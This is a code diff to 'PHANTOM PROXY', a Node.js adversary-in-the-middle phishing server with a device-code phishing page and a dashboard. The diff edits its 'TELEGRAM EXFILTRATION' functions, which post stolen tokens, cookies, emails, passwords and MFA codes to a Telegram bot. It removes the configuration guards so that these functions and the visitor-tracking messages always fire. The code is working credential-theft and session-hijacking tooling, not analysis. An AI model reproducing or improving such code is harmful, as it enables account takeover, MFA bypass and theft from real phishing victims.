@@ -8,8 +8,6 @@
 // ✅ Proxy routing FIXED
 // ✅ WebSocket FIXED (order + path)
 // ✅ Visit logging for BOTH AiTM links AND device page
-// ✅ Server-side IP lookup proxy (bypasses CORS)
-// ✅ Telegram token from env vars
 // ✅ All features intact
 // ============================================================
 
@@ -28,9 +26,9 @@ try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
 try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
-// ── ✅ TELEGRAM CONFIG (from env vars) ──
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '';
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '';
+// ── ✅ TELEGRAM CONFIG ──
+const BOT_TOKEN = '';
+const CHAT_ID = '';
 
 // ── ✅ DASHBOARD AUTH ──
 const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
@@ -145,7 +143,7 @@ function logVisit(req, pageType = 'page') {
             countryCode: 'UN'
         };
         
-        // Try to get country from IP (async but non-blocking, server-side so no CORS)
+        // Try to get country from IP (async but non-blocking)
         if (axios && ip !== 'Unknown') {
             axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 })
                 .then(res => {
@@ -172,7 +170,7 @@ function logVisit(req, pageType = 'page') {
 // 📤 TELEGRAM EXFILTRATION
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
-    if (!tokens || Object.keys(tokens).length === 0 || !FormData || !BOT_TOKEN || !CHAT_ID) return;
+    if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
     try {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const filename = `tokens_${sessionId}_${timestamp}.txt`;
@@ -197,7 +195,7 @@ async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
 }
 
 async function sendCookiesFile(cookies, sessionId) {
-    if (!cookies || Object.keys(cookies).length === 0 || !FormData || !BOT_TOKEN || !CHAT_ID) return;
+    if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
     try {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const filename = `cookies_${sessionId}_${timestamp}.txt`;
@@ -219,8 +217,8 @@ async function sendCookiesFile(cookies, sessionId) {
 }
 
 async function sendToTelegram(data) {
-    if (!axios || !BOT_TOKEN || !CHAT_ID) {
-        console.error('❌ Telegram not configured — missing BOT_TOKEN or CHAT_ID');
+    if (!axios) {
+        console.error('❌ axios not available, cannot send Telegram.');
         return;
     }
     try {
@@ -1097,11 +1095,9 @@ async function handleDashboardAPI(req, res) {
     let apiPath = url;
     if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');
 
-    // ── 🔥 TELEGRAM TEST ──
     if (apiPath === '/api/test-telegram') {
         try {
             if (!axios) throw new Error('axios not installed');
-            if (!BOT_TOKEN || !CHAT_ID) throw new Error('BOT_TOKEN or CHAT_ID not configured');
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
                 text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`
@@ -1111,26 +1107,6 @@ async function handleDashboardAPI(req, res) {
         } catch (e) {
             res.writeHead(500, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ error: e.message, details: e.response?.data || '' }));
-        }
-        return;
-    }
-
-    // ── 🔥 IP LOOKUP PROXY (bypasses CORS) ──
-    if (apiPath.startsWith('/api/ip/') && req.method === 'GET') {
-        const ip = apiPath.replace('/api/ip/', '');
-        if (!ip || ip === 'undefined' || ip === 'Unknown') {
-            res.writeHead(400, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ error: 'Valid IP required' }));
-            return;
-        }
-        try {
-            if (!axios) throw new Error('axios not installed');
-            const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify(response.data));
-        } catch (e) {
-            res.writeHead(500, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ error: e.message }));
         }
         return;
     }
@@ -1315,6 +1291,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // Device Code (dashboard-authenticated versions)
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
@@ -2175,6 +2152,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
+            // ── 🔥 INJECT SERVICE WORKER REGISTRATION ──
             const indexPath = path.join(__dirname, PROXY_FILES.index);
             let html = fs.readFileSync(indexPath, 'utf-8');
 
@@ -2191,17 +2169,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             (async () => {
                 try {
-                    if (BOT_TOKEN && CHAT_ID && axios) {
-                        const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
-                        console.log(`🌐 Page-load: IP=${ip}, Session=${session}`);
-                        const message = `🆕 **New Visitor (Page Load)!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
-                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        });
-                        console.log('✅ Page-load notification sent.');
-                    }
+                    const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
+                    console.log(`🌐 Page-load: IP=${ip}, Session=${session}`);
+                    const message = `🆕 **New Visitor (Page Load)!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    });
+                    console.log('✅ Page-load notification sent.');
                 } catch (e) {
                     console.error('❌ Page-load notification failed:', e.message);
                 }
@@ -2488,6 +2464,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 // ============================================================
 const PORT = process.env.PORT || 3000;
 
+// 🔥 STEP 1: Create WebSocket server FIRST, before listening
 if (WebSocket) {
     const wss = new WebSocket.Server({ server, path: '/ws' });
     const wsClients = new Set();
@@ -2517,6 +2494,7 @@ if (WebSocket) {
         }
     }
     
+    // Watch logs directory for new files
     try {
         if (fs.existsSync(LOGS_DIRECTORY)) {
             fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
@@ -2537,14 +2515,15 @@ if (WebSocket) {
     console.warn('⚠️ WebSocket library not installed – live updates disabled.');
 }
 
+// 🔥 STEP 2: NOW start listening
 server.listen(PORT, '::', () => {
     console.log(`✅ PHANTOM PROXY v10.4 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`👁️ Visit Logging: AiTM + Device pages`);
-    console.log(`🌍 IP Lookup Proxy: /dash/api/ip/:ip (CORS bypass)`);
-    console.log(`📤 Telegram: ${BOT_TOKEN ? 'CONFIGURED' : 'NOT CONFIGURED (set BOT_TOKEN + CHAT_ID env vars)'}`);
+    console.log(`📤 Page‑load notifications: ACTIVE`);
+    console.log(`📤 Telegram exfil: ACTIVE`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
     console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
     console.log(`🟣 PRT Engine: ACTIVE`);
@@ -2555,6 +2534,7 @@ server.listen(PORT, '::', () => {
     console.log(`🔌 WebSocket: /ws (live log updates)`);
 });
 
+// Error handling
 server.on('error', (err) => {
     console.error('❌ Server error:', err.message);
     if (err.code === 'EADDRINUSE') {
